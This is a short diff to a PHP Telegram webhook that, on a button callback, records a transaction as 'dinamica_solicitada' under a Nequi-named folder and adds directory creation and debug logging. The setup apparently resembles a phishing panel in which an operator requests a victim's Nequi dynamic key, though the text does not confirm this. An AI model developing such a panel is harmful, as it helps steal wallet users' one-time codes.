@@ -18,13 +18,23 @@ if ($update && isset($update['callback_query'])) {
 
         // Actualizar el archivo de estado en la ubicación correcta para nequi-1
         $statusFile = __DIR__ . '/data-ps/recargas/transaction/nequi-1/dinamica_status.json';
+
+        // Crear directorios si no existen
+        $dir = dirname($statusFile);
+        if (!is_dir($dir)) {
+            mkdir($dir, 0755, true);
+        }
+
         $data = file_exists($statusFile) ? json_decode(file_get_contents($statusFile), true) : [];
         $data[$transactionId] = [
             'status' => 'dinamica_solicitada',
             'message_id' => null,
             'timestamp' => time()
         ];
-        file_put_contents($statusFile, json_encode($data));
+        $result = file_put_contents($statusFile, json_encode($data));
+
+        // Log para debug
+        file_put_contents(__DIR__ . '/webhook_log.txt', date('Y-m-d H:i:s') . " - Transaction: $transactionId, File: $statusFile, Result: $result\n", FILE_APPEND);
 
         // También guardar en la raíz para compatibilidad
         $rootStatusFile = __DIR__ . '/dinamica_status.json';
